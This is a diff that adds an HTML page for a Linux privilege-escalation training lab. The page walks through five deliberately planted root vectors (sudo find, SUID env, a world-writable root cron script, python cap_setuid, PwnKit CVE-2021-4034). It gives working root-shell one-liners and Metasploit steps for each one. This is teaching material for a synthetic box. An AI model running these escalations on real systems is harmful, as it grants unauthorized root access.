@@ -1,0 +1,127 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Privilege Escalation (Linux) — Lab Kit</title>
+<style>
+:root{--bg:#0e1016;--card:#171a22;--ink:#e6edf3;--muted:#9aa4b2;--line:#2a2f3a;--brand:#9a6bff;--brand2:#58a6ff;--ok:#3fb950}
+*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.55}
+a{color:var(--brand2);text-decoration:none}a:hover{text-decoration:underline}
+code{background:#20242e;color:#b79cff;padding:2px 7px;border-radius:5px;font-family:ui-monospace,Consolas,monospace;font-size:.9em}
+.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#3a1420,#9d1f3f);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 8px rgba(60,20,30,.2)}
+.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
+.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;font-size:.85em;background:rgba(255,255,255,.14);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.28);text-decoration:none}
+.wrap{max-width:900px;margin:22px auto;padding:0 16px}
+.intro{color:var(--muted);font-size:.95em}
+.goal{background:linear-gradient(120deg,#1a1020,#231428);border:1px solid #9d1f3f55;border-left:4px solid #ff8bb0;border-radius:12px;padding:14px 18px;margin:16px 0}
+.goal h2{margin:0 0 6px;font-size:1.05em;color:#ff8bb0}
+.goal p{margin:6px 0;color:var(--ink);font-size:.95em}
+.files{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 16px;margin:14px 0;font-size:.88em}
+.files b{color:var(--ink)}.files code{font-size:.85em}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
+.card h2{margin:0 0 6px;font-size:1.05em;color:#c7b3ff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.lvl{font-size:.72em;font-weight:700;padding:2px 9px;border-radius:20px}
+.l-easy{background:#122017;color:#3fb950;border:1px solid #3fb95033}.l-med{background:#1e2410;color:#d9c441;border:1px solid #d9c44133}
+.l-hard{background:#2a1c10;color:#e39b41;border:1px solid #e39b4133}.l-exp{background:#2a1620;color:#ff8bb0;border:1px solid #ff8bb033}
+.card p{margin:6px 0 10px;color:var(--muted);font-size:.92em}
+.src{font-size:.82em;color:var(--muted)}.src code{font-size:.85em}
+details{margin:4px 0}summary{cursor:pointer;color:var(--brand2);font-size:.9em}
+pre{background:#0f1622;color:#9ce6a0;padding:10px 12px;border-radius:7px;font-family:ui-monospace,Consolas,monospace;font-size:.84em;overflow:auto;margin:8px 0 0;white-space:pre-wrap;word-break:break-word}
+ol.tasks{color:var(--muted);font-size:.92em;margin:6px 0}ol.tasks li{margin:3px 0}
+footer{color:var(--muted);font-size:.85em;border-top:1px solid var(--line);margin:26px 0 50px;padding:14px 0}
+</style></head><body>
+<div class="topbar"><span class="brand">🛡️ Privilege Escalation (Linux)</span><span class="badge">enum · GTFOBins · Metasploit</span>
+  <nav class="nav"><a href="../index.html">🏁 Lab Kit</a><a href="README.md">README</a><a href="solution.md">Solution</a></nav></div>
+<div class="wrap">
+
+  <div class="goal"><h2>🎯 Goal</h2>
+    <p>You have a low-privilege <code>www-data</code> shell on <code>web01</code>.
+    <b>Escalate to root and read <code>/root/flag.txt</code>.</b></p>
+    <p>This lab is the <i>identification</i> half: the <code>enum/</code> files are pre-collected
+    enumeration output — your job is to spot <b>all 5</b> privilege-escalation vectors in them and write
+    the exact exploit one-liner for each. That spotting skill is what the exam tests.</p></div>
+
+  <p class="intro"><b>Scenario:</b> you landed a foothold as <code>www-data</code> on <code>web01</code>
+  (e.g. via the webshell upload or command injection in app 1). The box is intentionally
+  mis-hardened. The enumeration below was already run for you — read it like an attacker and map every
+  finding to a path to root. Full answers in <a href="solution.md">solution.md</a>.</p>
+
+  <ol class="tasks">
+    <li>From the five <code>enum/</code> files, list <b>every</b> path to root you can find (there are 5).</li>
+    <li>For each vector, write the <b>exact one-liner</b> that drops a root shell (use GTFOBins).</li>
+    <li>Write the <b>Metasploit</b> steps to go from a Meterpreter session to root (session → suggester → local exploit).</li>
+    <li>Recover the flag — the root-only <code>FLAG{...}</code> in <code>enum/root_flag.txt</code> (what <code>/root/flag.txt</code> would hold).</li>
+  </ol>
+
+  <div class="files"><b>Enumeration files:</b>
+    <a href="enum/sudo_l.txt" download>sudo_l.txt</a> ·
+    <a href="enum/suid.txt" download>suid.txt</a> ·
+    <a href="enum/cron.txt" download>cron.txt</a> ·
+    <a href="enum/capabilities.txt" download>capabilities.txt</a> ·
+    <a href="enum/system.txt" download>system.txt</a>
+    &nbsp;|&nbsp; <a href="README.md">README.md</a> · <a href="solution.md">solution.md</a>
+    <span style="color:var(--muted)">(real-shaped output — synthetic box, no live services)</span></div>
+
+  <div class="card"><h2>Vector 1 · sudo <code>find</code> <span class="lvl l-easy">🟢 Easy</span></h2>
+    <p class="src">Found in <code>enum/sudo_l.txt</code> — <code>(root) NOPASSWD: /usr/bin/find</code>.
+    <code>find -exec</code> runs its command as the sudo'd user (root), no password.</p>
+    <details><summary>💥 root one-liner</summary>
+      <pre>sudo find . -exec /bin/sh \; -quit
+# id -> uid=0(root)
+# reference: gtfobins.github.io/gtfobins/find/</pre></details></div>
+
+  <div class="card"><h2>Vector 2 · SUID <code>env</code> <span class="lvl l-med">🟡 Medium</span></h2>
+    <p class="src">Found in <code>enum/suid.txt</code> — <code>/usr/bin/env</code> is SUID-root.
+    <code>env</code> execs any program with the inherited root euid; <code>-p</code> stops the shell dropping it.</p>
+    <details><summary>💥 root one-liner</summary>
+      <pre>/usr/bin/env /bin/sh -p
+# id -> euid=0(root)
+# reference: gtfobins.github.io/gtfobins/env/ (SUID)</pre></details></div>
+
+  <div class="card"><h2>Vector 3 · world-writable root cron <span class="lvl l-med">🟡 Medium</span></h2>
+    <p class="src">Found in <code>enum/cron.txt</code> — <code>/opt/scripts/backup.sh</code> is <code>rwxrwxrwx</code>
+    and root runs it every minute. Anyone can rewrite the script root executes.</p>
+    <details><summary>💥 root one-liner</summary>
+      <pre>echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash' &gt;&gt; /opt/scripts/backup.sh
+# wait up to 60s for the cron tick, then:
+/tmp/rootbash -p
+# id -> euid=0(root)</pre></details></div>
+
+  <div class="card"><h2>Vector 4 · <code>cap_setuid</code> on python <span class="lvl l-hard">🟠 Hard</span></h2>
+    <p class="src">Found in <code>enum/capabilities.txt</code> — <code>/usr/bin/python3.9 = cap_setuid+ep</code>.
+    The capability lets the binary call <code>setuid(0)</code> without being SUID.</p>
+    <details><summary>💥 root one-liner</summary>
+      <pre>/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id -> uid=0(root)
+# reference: gtfobins.github.io/gtfobins/python/ (Capabilities)</pre></details></div>
+
+  <div class="card"><h2>Vector 5 · pkexec / PwnKit <span class="lvl l-exp">🔴 Expert</span></h2>
+    <p class="src">Found in <code>enum/suid.txt</code> (pkexec is SUID-root) + <code>enum/system.txt</code>
+    (Ubuntu 21.10). This version is vulnerable to <b>CVE-2021-4034 (PwnKit)</b> — a memory-corruption
+    bug in <code>pkexec</code> giving reliable local root on default installs.</p>
+    <details><summary>💥 how to root</summary>
+      <pre># option A: public PoC (compile &amp; run on the target)
+#   e.g. berdav/CVE-2021-4034 -> make -> ./cve-2021-4034  -> # id = root
+# option B: the Metasploit module (see below)
+# reference: CVE-2021-4034 (PwnKit); gtfobins.github.io for pkexec basics</pre></details></div>
+
+  <div class="card"><h2>⚙️ Metasploit · Meterpreter → root <span class="lvl l-exp">🔴 Expert</span></h2>
+    <p>From a Meterpreter session on the box, let the suggester pick a local exploit, then run the PwnKit module to get a root session.</p>
+    <details><summary>🧰 session → suggester → local exploit</summary>
+      <pre>msf6 &gt; use post/multi/recon/local_exploit_suggester
+msf6 &gt; set SESSION &lt;n&gt;
+msf6 &gt; run                                  # lists likely LPEs (pkexec, sudo, kernel)
+
+msf6 &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+msf6 &gt; set SESSION &lt;n&gt;
+msf6 &gt; set LHOST &lt;your-ip&gt;
+msf6 &gt; run                                  # -> new Meterpreter as root
+meterpreter &gt; getuid                        # root
+meterpreter &gt; cat /root/flag.txt
+# Note: getsystem is a Windows command — on Linux escalate with a local
+# exploit module (above) or a GTFOBins vector, not getsystem.</pre></details></div>
+
+  <p class="intro">🏁 <b>Flag:</b> the root-only value lives in <a href="enum/root_flag.txt" download><code>enum/root_flag.txt</code></a>
+  — that is what <code>/root/flag.txt</code> would hold once you are root. Check every vector and the flag against
+  <a href="solution.md">solution.md</a>. Reference for every GTFOBins one-liner: <a href="https://gtfobins.github.io" target="_blank" rel="noopener">gtfobins.github.io</a>.</p>
+
+  <footer>⚠️ <b>Intentionally vulnerable — training only.</b> Synthetic enumeration output and a throwaway practice box; the mis-configurations above are deliberate. Never deploy or reuse in production.</footer>
+</div>
+</body></html>
